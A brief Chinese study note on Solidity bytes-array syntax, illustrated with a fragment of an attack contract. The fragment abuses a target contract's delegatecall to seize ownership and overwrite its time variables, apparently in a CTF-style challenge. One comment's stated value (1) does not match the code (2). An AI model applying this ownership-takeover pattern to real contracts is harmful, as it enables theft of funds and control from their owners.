# bytes数组写法

```solidity
 bytes[] memory datas = new bytes[](1);
                  datas[0] = abi.encodeWithSelector(
                      bytes4(keccak256("setZDriveowner(uint256,uint256)")),
            uint256(uint160(address(this))), //delegatecall委托合约,设置address(this)为owner
            uint256(uint160(address(this))) //设置rewindBeforeTime为address(this)
        );

        ekko.setZDriveowner(datas);
        require(ekko.owner() == address(this), "u r notowner"); //检查这步delegatecall是否成功设置address(this)为owner

        bytes[] memory timeDatas = new bytes[](2);
        bytes memory beforeTime = abi.encodeWithSelector(
            bytes4(keccak256("setRewindBeforeTime(uint256)")),
            7
        ); //delegatecall到攻击合约自己写的这个函数,设置Time0==7
        bytes memory afterTime = abi.encodeWithSelector(
            bytes4(keccak256("setRewindAfterTime(uint256)")),
            2
        ); //delegatecall到攻击合约自己写的这个函数,设置Time1==1
        timeDatas[0] = beforeTime;
        timeDatas[1] = afterTime;
        ekko.setTime(timeDatas);
```



> 更新: 2026-03-02 14:48:10  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/uwm08u7ai7pmaq9d>